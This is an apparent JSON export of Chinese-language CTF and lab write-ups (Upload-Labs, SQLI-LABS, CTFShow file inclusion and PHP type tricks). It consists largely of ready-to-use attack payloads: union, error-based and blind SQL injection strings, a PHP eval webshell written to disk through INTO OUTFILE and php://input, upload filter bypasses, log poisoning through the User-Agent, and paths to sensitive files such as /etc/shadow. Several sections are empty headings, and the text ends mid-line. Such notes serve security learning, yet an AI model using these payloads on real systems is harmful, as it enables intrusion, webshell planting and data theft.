[{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"Upload-Labs\nPass-011使用一句话木马，直接进行上传，发现php后缀被限制，修改为jpg后缀重新上传，上传成功。\n\n\n使用Burpsuite抓包\n\n将jpg后缀修改为php，发包\n\n就可以将php为后缀的文件上传到网站，使用蚁剑，复制图片地址\n\n2直接查看源码，发现就是js有一个checkFile()，将浏览器关闭js\n\n\n修改后就可以直接上传php文件，重复上述步骤\n源码\n就是对文件后缀做限制\nPass-02\n服务器MIME检测：即检测Content-Type的内容。\n绕过方法：修改类型为允许上传的类型即可。\n\n直接上传php文件，文件类型不正确，使用burpsuite抓包\n\n\n修改Content-Type为image/jpeg、image/png、image/gif\n\n上传成功\n源码就是对文件类型进行判断\n\nPass-03上传php文件\n\n基于黑名单检测：黑名单的安全性比白名单的安全性低很多，攻击手法自然也比白名单多。一般由个专门blacklist，里面包含常见的危险脚本文件。\n绕过办法：\n\n文件大小写让绕过（Php ，PhP pHp，等）\n\n黑白名单绕过（php，php2，php3，php5，phtml，asp，aspx，ascx，ashx，cer，asa，jsp，jspx）cdx，\\x00hh\\x46php\n\n基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功。\n基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功。\n用黑名单不允许上传.asp,.aspx,.php,.jsp后缀的文件，但可以上传.phtml、 .php3 .php5、php4、 .pht、php1、php2、phps【这些后缀会被当成php文件解析】等等。\n\n\n特殊文件名绕过\n\n修改数据包里的文件名为 test.php 或 test.asp_(下划线是空格)由于这种命名格式在   windows系统里是不允许的，所以在绕过上传之后windows系统会自动去掉.点和空格。Linux和Unix中没有这个特性。\n::$DATA(php在windows的时候如果文件名+”::DATA”会把::DATA之后的数据当作文件流处理，不会检测后缀名，且保持”::DATA”之前的文件名，其目的就是不检查后缀名)\n\n\n. .htaccess文件攻击（结合黑名单攻击）\n\n解析绕过\n\n\n\n使用双写绕过，因为会过滤::$DATA\n源码\nPass-04.htaccess是什么：\n全称是Hypertext Access(超文本入口) .htaccess文件也被成为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。\n\n.htaccess功能：\n文件夹密码保护、用户自定义重定向、自定义404页面、扩展名伪静态化、禁止特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表\n很可惜，这么一个强大的功能默认是不开启的 Apache （有伪静态的都可以试试）\n\n用法：\nAddType application/x-httpd-php .jpg 这个指令代表着.jpg文件会当做php来解析\nSetHandler application/x-httpd-php，意思是把所有文件都解析为php文件来执行。\n\nPass-05Pass-06\nPass-07\nPass-08\nPass-09\nPass-10\nPass-11\nPass-12\nPass-13\nPass-14\nPass-15\nPass-16\nPass-17\nPass-18\nPass-20\nPass-21\n","slug":"Upload-Labs","date":"2022-11-25T07:32:45.429Z","categories_index":"","tags_index":"","author_index":"Yum1"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"Less-1判断是否存在注入:\n?id=1' and 1=1 --+\n\n判断字段数:\n?id=1' order by 3--+\n\n判断显错位:\n?id=-1' union select 1,2,3--+\n\n判断库名:\n?id=-1' union select 1,database(),3--+\n\n判断表名:\n?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema='security'--+\n\n?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 3,1--+\n\n?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+\n//可能会因为显示位不全，显示错误\n\n判断列名:\n?id=-1' union select 1,column_name,3 from information_schema.columns where table_schema='security' and table_name='emails'--+\n\n?id=-1' union select 1,column_name,3 from information_schema.columns where table_schema='security' and table_name='users'--+\n\n判断数据:\n?id=-1' union select 1,id,3 from emails--+\n\nLess-2类第一关\nLess-3(‘1’)\n判断是否存在注入:\n?id=1') and 1=1 --+\n下面类第一关\n\nLess-4$id = '\"' . $id . '\"';\n$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";\n\n判断是否存在注入:\n?id=1\") and 1=1 --+\n下面类第一关\n\nLess-5盲注&amp;报错注入\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n\n    if($row)\n    {\n      echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;';\t\n      echo 'You are in...........';\n      echo \"&lt;br&gt;\";\n        echo \"&lt;/font&gt;\";\n      }\n    else \n    {\n    \n    echo '&lt;font size=\"3\" color=\"#FFFF00\"&gt;';\n    print_r(mysql_error());\n    echo \"&lt;/br&gt;&lt;/font&gt;\";\t\n    echo '&lt;font color= \"#0000ff\" font size= 3&gt;';\t\n    \n    }\n}\n    else { echo \"Please input the ID as parameter with numeric value\";}\n\n判断是否存在注入:\n?id=1' and 1=1 --+\n\n判断字段数:\n?id=1' order by 3--+\n\n判断显错位:\n盲注没有显错位\n\n判断库名:\n?id=1' and updatexml(1,concat(0x7e,(SELECT database()),0x72),1)--+\n\n判断表名:\n?id=1' and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1)--+\n\n判断列名:\n?id=1' and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x7e),1)--+\n\n判断数据:\n?id=1' and updatexml(1,concat(0x7e,(SELECT id from users limit 0,1),0x7e),1)--+\n\nupdatexml() 更新xml文档的函数\n\n语法：updatexml(目标xml内容，xml文档路径，更新的内容)\n\nupdatexml(1,concat(0x7e,(SELECT database()),0x7e),1)\n\n实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了\n\n但是报错的时候他其实已经执行了那个子查询代码！\n\n[0x7e实际是是16进制，Mysql支持16进制，但是开头得写0x 0x7e是一个特殊符号，然后不符合路径规则报错]~ ~\n\n添加一个不符合规则的符号进行报错，从而爆出子查询的内容：SELECT database()\n\nupdatexml ()这个函数一般是配合and或者是or使用的，他和联合查询不同，不需要在意什么字段数\n\neg:\nselect *from news where id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)\n\n但是要注意，and情况下只要一个为False，就会判定是False,所以如果and前面的条件不成立的情况下，就不会执行之后的语句。所以使用的时候建议使用or\n\n某些没有回显盲注也可以用这个updatexml()做出来。\n\n但是报错一般有长度限制，不能输出太长的数据，尽量不要使用group_concat()。\n\nSELECT * FROM users union select updatexml(1,concat(0x7e,(SELECT database()),0x7e),1);\n\n1105 - XPATH syntax error: '~security~'\n\nLess-6判断是否存在注入:\n?id=1\" and 1=1 --+\n其他类题5\n\nLess-7outfile 向服务器写入文件\n\n在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个：\n写\ninto dumpfile()//保留格式\ninto outfile()//原始数据\n读\nload_file()\n\nunion select 1,'&lt;?php eval($_REQUEST[8])?&gt;' into outfile 'c:/phpstudy/www/1.php'\n\n这些都是需要设置secure_file_priv=，如果他为空则可以指定任意目录，如果有设置等于某个路径就只能在这个指定路径下，而他为null时则禁止导入导出功能\n\n判断字段数:\n?id=1')) order by 3 --+\n\n写马:\n?id=1')) union select 1,\"&lt;?php eval($_REQUEST[1])?&gt;\",3 into outfile \"D:/AppData/phpstudy_pro/WWW/sqli-labs-master/Less-7/shell.php\" --+\n\n访问一句话木马\nhttp://127.0.0.1:8090/Less-7/shell.php?1=phpinfo();\n\nLess-8盲注\n布尔型盲注:\nlength()函数 返回字符串长度\n\nsubstr() 截取字符串 (语法：SUBSTR(str,pos,len);)\n\nascii() 返回字符的ascii码 [将字符变为数字wei]\n\n时间型盲注:\nsleep()将程序挂起一段时间 n为n秒\n\nif(expr1,expr2,expr3)判断语句 如果第一个语句正确就执行第二个语句，如果错误执行第三个语句\n\n拆解库名长度\n?id=1' and (length(database()))=8 --+\n\n利用ASCII码猜解当前数据库名称：\n?id=1' and (ascii(substr(database(),1,1)))=115 --+\n返回正常，说明数据库名称第一位是s\n\n?id=1' and (ascii(substr(database(),2,1)))=101 --+\n返回正常，说明数据库名称第二位是e\n\n猜表名:\n?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101 --+\n如果返回正常，说明数据库表名的第一个的第一位是e\n\n猜字段名:\n?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1)))=105 --+\n如果返回正常，说明emails表中的列名称第一位是i\n\nLess-9同样按照盲注的手法，尝试后发现这里无论输入什么条件，回显的结果都是一个，这就证明不能再用刚刚布尔盲注的做法了，要尝试使用时间盲注\n布尔盲注页面会有两种状态\n时间盲注无论条件是什么都只返回一种页面\n猜解库名长度:\n?id=1' and if(length(database())=8,sleep(5),1) --+\n\n利用ASCII码猜解当前数据库名称:\n?id=1' and if((ascii(substr(database(),1,1))=115),sleep(5),1) --+\n延时，说明数据库名称第一位是s\n\n猜表名:\n?id=1' and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101),sleep(5),1) --+\n延时，说明数据库表名的第一个的第一位是e\n\n猜字段名:\n?id=1' and if((ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1))=105),sleep(5),1) --+\n如果返回正常，说明emails表中的列名称第一位是i\n\nLess-10闭合方式有区别\n?id=1\" and if(length(database())=8,sleep(5),1) --+\n其他类题九\n\nLess-11POST传参\n$uname=$_POST['uname'];\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\n\n万能密码:\n' or 1=1 -- + //要有空格\n' or 1=1#\n\n判断字段数:\n' or 1=1 order by 2 -- +\n\n判断显错位:\n' union select 1,2#\n\n判断库名:\n' union select 1,database()#\n\n判断表名:\n?id=10' union select 1,table_name from information_schema.tables where table_schema='security'#\n\n判断列名:\n?id=10' union select 1,column_name from information_schema.columns where table_schema='security' and table_name ='users' limit 1,1#\n\n判断数据:\n?id=10' union select 1,username from users#\n\nLess-12闭合有区别，尝试万能密码\n\") or 1=1#\n\n其他类题十一\n\nLess-13post传参的报错注入\n判断是否存在注入:\n?id=1' and 1=1 -- qwe\n\n判断库名:\n')and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- qwe\n\n判断表名：\n')and updatexml(1,concat(0x7e,(select table_name from\ninformation_schema.tables where table_schema='security'limit 0,1),0x7e),1)-- qwe\n\n判断列名：\n')and updatexml(1,concat(0x7e,(select column_name from\ninformation_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1)-- qwe\n\n判断数据：\n')and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)-- qwe\n\n类题五\n\nLess-14类题13\n\n判断库名：\n\"and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- qwe\n\nLess-15POST盲注\nif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd']))\n{\n    $uname=$_POST['uname'];\n    $passwd=$_POST['passwd'];\n\n    //logging the connection parameters to a file for analysis.\n    $fp=fopen('result.txt','a');\n    fwrite($fp,'User Name:'.$uname);\n    fwrite($fp,'Password:'.$passwd.\"\\n\");\n    fclose($fp);\n\n\n    // connectivity \n    @$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\n    $result=mysql_query($sql);\n    $row = mysql_fetch_array($result);\n\n    if($row)\n    {\n          //echo '&lt;font color= \"#0000ff\"&gt;';\t\n          \n          echo \"&lt;br&gt;\";\n        echo '&lt;font color= \"#FFFF00\" font size = 4&gt;';\n        //echo \" You Have successfully logged in\\n\\n \" ;\n        echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;';\t\n        echo \"&lt;br&gt;\";\n        //echo 'Your Login name:'. $row['username'];\n        echo \"&lt;br&gt;\";\n        //echo 'Your Password:' .$row['password'];\n        echo \"&lt;br&gt;\";\n        echo \"&lt;/font&gt;\";\n        echo \"&lt;br&gt;\";\n        echo \"&lt;br&gt;\";\n        echo '&lt;img src=\"../images/flag.jpg\"  /&gt;';\t\n        \n          echo \"&lt;/font&gt;\";\n      }\n    else  \n    {\n        echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;';\n        //echo \"Try again looser\";\n        //print_r(mysql_error());\n        echo \"&lt;/br&gt;\";\n        echo \"&lt;/br&gt;\";\n        echo \"&lt;/br&gt;\";\n        echo '&lt;img src=\"../images/slap.jpg\"   /&gt;';\t\n        echo \"&lt;/font&gt;\";  \n    }\n}\n\n猜解库名长度:\n' or (length(database()))=8 #\n\n利用ASCII码猜解当前数据库名称:\n' or (ascii(substr(database(),1,1)))=115#\n返回正常，说明数据库名称第一位是s\n\n' or (ascii(substr(database(),2,1)))=101#\n返回正常，说明数据库名称第二位是e\n\n猜表名:\n' or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101#\n如果返回正常，说明数据库表名的第一个的第一位是e\n\n猜字段名:\n'or (ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1)))=105#\n如果返回正常，说明emails表中的列名称第一位是i\n\nLess-16$uname='\"'.$uname.'\"';\n$passwd='\"'.$passwd.'\"'; \n\n@$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\";\n\n类题15\n闭合区别\n\") or (length(database()))=8 #\n\nLess-17密码重置，所以从下面的password入手，使用报错注入\n判断是否存在注入:\n' or 1=1 -- +\n\n判断库名:\n' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+\n\n判断表名:\n' and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1)--+\n\n判断列名:\n' and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x7e),1)--+\n\n判断数据:\n' and updatexml(1,concat(0x7e,(SELECT id from users limit 0,1),0x7e),1)--+\n\nLess-18进入网站就显示了ip，网页记录了ip、浏览器信息以及其他信息就可能是头注入\n请求头\nUser-Agent\t\t浏览器的身份标识字符串\nReferer\t\t\t表示浏览器所访问的前一个页面，可以认为是之前访问页面的链接将浏\t\t\t\t\t览器带到了当前页面。\nAccept\t\t\t可接受的响应内容类型（Content-Types）。\nX-Forwarded-For\t可以用来表示HTTP请求端真实IP\nDate\t\t\t发送该消息的日期和时间（以RFC 7231中定义的\"HTTP日期\"格式来发\t\t\t\t 送）\n\n\n$insert = \"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\";\n注入点为uagent即User-Agent\n\n必须要登录成功才会记录IP，弱口令\nuname=admin&amp;passwd=admin\n\n\n判断库名:\n'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1),1,1)-- #\n\n$insert = \"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (''and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1),1,1)-- #', '$IP', $uname)\";\n后面的1,1)为了补齐后面'$IP', $uname两个字段\n\n判断表名:\n'and updatexml(1,concat(0x7e,(select table_name from\ninformation_schema.tables where table_schema='security'limit 0,1),0x7e),1),1,1)-- #\n\n判断列名:\n'and updatexml(1,concat(0x7e,(select column_name from\ninformation_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1),1,1)-- qwe\n\n判断数据:\n'and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1),1,1)-- qwe\n\nLess-19注入点与18不同，其他类18\n注入点变为referer\n\n$insert=\"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')\";\n\nLess-20登录之后会显示很多个人信息，特别是提示cookie\n\n诸如点是cookie\n$sql=\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\";\n\n判断库名:\n'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- qwe\n\n判断表名:\n'and updatexml(1,concat(0x7e,(select table_name from\ninformation_schema.tables where table_schema='security'limit 0,1),0x7e),1)-- qwe\n\n判断列名:\n'and updatexml(1,concat(0x7e,(select column_name from\ninformation_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1)-- qwe\n\n判断数据:\n'and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)-- qwe\n\nLess-21Cookie被base64编码，把payload用base64编码再发包\n\n判断库名:\nadmin 'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) and '1'='1\nYWRtaW4gJ2FuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoU0VMRUNUIGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAnMSc9JzE=\n\n判断表名:\nadmin 'and updatexml(1,concat(0x7e,(select table_name from\ninformation_schema.tables where table_schema='security'limit 0,1),0x7e),1) and '1'='1\n\n判断列名:\n'and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1) and '1'='1\n\n判断数据:\nand updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)and '1'='1\n\nLess-22Less-23\n","slug":"SQLI-LABS","date":"2022-11-25T07:32:45.427Z","categories_index":"","tags_index":"","author_index":"Yum1"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"文件包含PHP包含函数：\ninclude()：如果包含文件未找到会显示警告，脚本继续执行；\ninclude_once()：包含过的文件不再包含，包含文件未找到会显示警告，脚本继续执行；\nrequire()：包含文件未找到会产生致命错误，脚本终止；\nrequire_once()：包含过的文件不再包含，包含文件未找到会产生致命错误，脚本终止。\n\n敏感文件\n敏感文件\nLinux/Unix系统\n/etc/passwd                                                                 //  账户信息\n/etc/shadow                                                                 //  账户密码文件\n/usr/local/app/apache2/conf/httpd.conf                       //   Apache2默认配置文件\n/usr/local/app/apache2/conf/extra/httpd-vhost.conf    //   虚拟网站配置\n/usr/local/app/php5/lib/php.ini                                     //   PHP相关配置\n/etc/httpd/conf/httpd.conf                                            //   Apache配置文件\n/etc/my.conf                                                                 //   mysql 配置文件\n\nPHP伪协议php - PHP伪协议总结_个人文章 - SegmentFault 思否\nfile://条件\nallow_url_fopen:off/on\nallow_url_include :off/on\n\n作用\n用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。\n说明\nfile:// 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen() 和 file_get_contents()，include_path 会可选地搜索，也作为相对的路径。\n用法\n/path/to/file.ext\nrelative/path/to/file.ext\nfileInCwd.ext\nC:/path/to/winfile.ext\nC:\\path\\to\\winfile.ext\n\\\\smbserver\\share\\path\\to\\winfile.ext\nfile:///path/to/file.ext\n\nex\n\nfile://[文件的绝对路径和文件名]\nhttp://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt\n\n\n[文件的相对路径和文件名]\nhttp://127.0.0.1/include.php?file=./phpinfo.txt\n\n\n[http：//网络路径和文件名]\nhttp://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt\n\n\n\nphp://\n条件：\nallow_url_fopen:off/on\nallow_url_include :仅php://input php://stdin php://memory php://temp 需要on\n\n\n作用：php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。\n说明：PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。\n\n\nphp://filter该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：\n\n可用的过滤器列表\n\nex\nphp://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）\nhttp://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php\n\nphp://input + [POST DATA]执行php代码\nhttp://127.0.0.1/include.php?file=php://input\n[POST DATA部分]\n&lt;?php phpinfo(); ?&gt;\n\n若有写入权限，写入一句话木马\nhttp://127.0.0.1/include.php?file=php://input\n[POST DATA部分]\n&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;\n\nCTFShowweb78if(isset($_GET['file'])){\n    $file = $_GET['file'];\n    include($file);\n}else{\n    highlight_file(__FILE__);\n}\n\n无过滤，直接include\n?file=php://filter/convert.base64-encode/resource=flag.php\n\nbp抓包，给file传参?file=php://input然后在post输出想要执行的代码\n\nweb79if(isset($_GET['file'])){\n    $file = $_GET['file'];\n    $file = str_replace(\"php\", \"???\", $file);\n    include($file);\n}else{\n    highlight_file(__FILE__);\n}\n\n相对于上一题，$file中的php转换了？？？即过滤了php，所以php协议不能用了\nstr_replace区分大小写\nstr_ireplace不区分\n\n\n所以可以使用大小写绕过\n\n\ndata协议\nphp5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码 \n\npayload：?file=data://text/plain,&lt;?= system('tac flag.???');?&gt;\n逗号后面是要执行的php代码\n或者\npayload：?file=data://text/plain;base64,PD89IHN5c3RlbSgndGFjIGZsYWcuPz8/Jyk7Pz4=\n逗号后面是要执行的php代码的base64加密形式\n \n注：data://可以用data:代替\n\n\n\nweb80过滤了php和data\nif(isset($_GET['file'])){\n    $file = $_GET['file'];\n    $file = str_replace(\"php\", \"???\", $file);\n    $file = str_replace(\"data\", \"???\", $file);\n    include($file);\n}else{\n    highlight_file(__FILE__);\n}\n\n\n使用大小写绕过，先ls查看文件名再查看flag\n\n\n日志文件包含\n\n\n日志文件包含伪造UA写入php代码\n日志文件记录了服务器收到的每一次请求的\nIP、访问时间、URL、User-Agent，这4项中的前两项的值都是我们无法控制的，我们只能在自己可以控制的字段上做手脚，其中URL字段由于URL编码的存在，空格等一些符号会自动进行url编码，存到日志当中时，不是一个正确的php语句，无法成功执行，而User-Agent则不会被进行任何二次处理，我们发什么内容，服务器就将其原封不动的写入日志。\n\n访问日志的位置和文件名在不同的系统上会有所差异\n\napache一般是/var/log/apache/access.log\n\napache2一般是/var/log/apache2/access.log\n\nnginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log\n\n这个Linux的nginx日志文件路径是/var/log/nginx/access.log，要在用文件包含漏洞读取日志文件的同时，修改ua头为我们想要执行的命令(burp中go要点两次才能执行命令，第一次将代码写入日志，第二次执行代码\n且操作一定不能出问题，如果报错就要销毁容器从头再来 \n因为php语法错误后不再解释执行后面代码，语法错误后，后面不管语法对不对都不执行了。我们包含了日志文件，如果日志文件中我们插入了错误的php代码，那么我们再次执行对的代码时会先执行那个错误的php代码，因为报错，所以后面正确的就不会执行了。\n?file=/var/log/nginx/access.log&amp;1=ls HTTP/1.1\n\n\n?file=/var/log/nginx/access.log&amp;1=cat%20fl0g.php\n\n\nweb81因为过滤了冒号，所以远程文件包含和大小写绕过不行了，只能用日志包含\nif(isset($_GET['file'])){\n    $file = $_GET['file'];\n    $file = str_replace(\"php\", \"???\", $file);\n    $file = str_replace(\"data\", \"???\", $file);\n    $file = str_replace(\":\", \"???\", $file);\n    include($file);\n}else{\n    highlight_file(__FILE__);\n}\n\n\nweb82","slug":"PHP伪协议","date":"2022-11-25T07:32:45.425Z","categories_index":"","tags_index":"","author_index":"Yum1"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"PHP特性web89利用数组进行绕过\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if(preg_match(\"/[0-9]/\", $num)){\n        die(\"no no no!\");\n    }\n    if(intval($num)){\n        echo $flag;\n    }\n}\n\nintval函数\n如果他的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0\n通过preg_match对num进行正则匹配，如果num是一个数，就会返回no no no\n?num[]=1\n\nweb90include(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"4476\"){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n}\n\nint intval ( mixed $var [, int $base = 10 ] )\n参数说明：\n\n$var：要转换成 integer 的数量值。\n$base：转化所使用的进制。\n\nintval($num,0)：\n如果 base 是 0，通过检测 var 的格式来决定使用的进制：\n\n如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，\n如果字符串以 “0” 开始，使用 8 进制(octal)；否则，\n将使用 10 进制 (decimal)。\n\nintval('4476.0')===4476    小数点  \nintval('+4476.0')===4476   正负号\nintval('4476e0')===4476    科学计数法\nintval('0x117c')===4476    16进制\nintval('010574')===4476    8进制\nintval(' 010574')===4476   8进制+空格\n\n因为我们提交的参数值默认就是字符串类型 所以我们可以直接输入 ?num=4476%23\n会转整形，从左向右看数字留下，字符就过\n\nweb91正则表达式是匹配方法 https://blog.csdn.net/qq_46091464/article/details/108278486 可以通过 %0a 绕过 payload： abc%0aphp\npreg_match()\n正则表达式中$\n匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\\n’ 或 ‘\\r’。要匹配 $ 字符本身，请使用 $。\n所以如果设置RegExp 对象的 Multiline 属性的条件下，$还会匹配到字符串结尾的换行符（也就是%0a)\n\ni \n不区分(ignore)大小写\n\nm\n多(more)行匹配\n若存在换行\\n并且有开始^或结束$符的情况下，\n将以换行为分隔符，逐行进行匹配\n$str = \"abc\\nabc\";\n$preg = \"/^abc$/m\";\npreg_match($preg, $str,$matchs);\n这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。\n\ns\n特殊字符圆点 . 中包含换行符\n默认的圆点 . 是匹配除换行符 \\n 之外的任何单字符，加上s之后, .包含换行符\n$str = \"abggab\\nacbs\";\n$preg = \"/b./s\";\npreg_match_all($preg, $str,$matchs);\n这样匹配到的有三个 bg b\\n bs\n\nA\n强制从目标字符串开头匹配;\n\nD\n如果使用$限制结尾字符,则不允许结尾有换行; \n\ne\n配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; \n\n?cmd=111%0aphp\n\n%0aphp 经过第一个匹配时，以换行符为分割也就是%0a，前面因为是空的，所以只匹配换行符后面的，所以可以通过。\n经过第二个正则表达式时，因为我们是%0aphp 不符合正则表达式的以php开头以php结尾。所以无法通过，最后输出flag\n\nweb92include(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)==4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n}\n\nintval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 \nintval('4476.0')===4476    小数点  \nintval('+4476.0')===4476   正负号\nintval('4476e0')===4476    科学计数法\nintval('0x117c')===4476    16进制\nintval('010574')===4476    8进制\nintval(' 010574')===4476   8进制+空格\n\n==4476是若等于用4476%23就会直接nonono\nweb93include(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]/i\", $num)){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)==4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n}\n\nintval('010574')===4476    8进制\n\nweb94include(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"4476\"){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]/i\", $num)){\n        die(\"no no no!\");\n    }\n    if(!strpos($num, \"0\")){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }\n}\n\n?num=4476.0\n\nweb95include(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]|\\./i\", $num)){\n        die(\"no no no!!\");\n    }\n    if(!strpos($num, \"0\")){\n        die(\"no no no!!!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }\n}\n\n可以通过8进制绕过但是前面必须多加一个字节 ?num=+010574或者?num=%2b010574\n%2b010574在GET获取之前就decode了，就完全等价于+010574，GET获取的就是+\n\nweb96highlight_file(__FILE__);\n\nif(isset($_GET['u'])){\n    if($_GET['u']=='flag.php'){\n        die(\"no no no\");\n    }else{\n        highlight_file($_GET['u']);\n    }\n}\n\nhighlight_file(filename,return)\n\nfilename\t必需。要进行高亮处理的 PHP 文件的路径。\nreturn\t可选。如果设置 true，则本函数返回高亮处理的代码。\n\n/?u=/var/www/html/flag.php              绝对路径\n/?u=./flag.php                          相对路径\n/?u=php://filter/resource=flag.php      php伪协议             \n\nweb97MD5函数无法处理数组\nMD5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。md5弱类型比较可以直接数组绕过，其结果都会转换为null，MD5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。\n\nPOST: 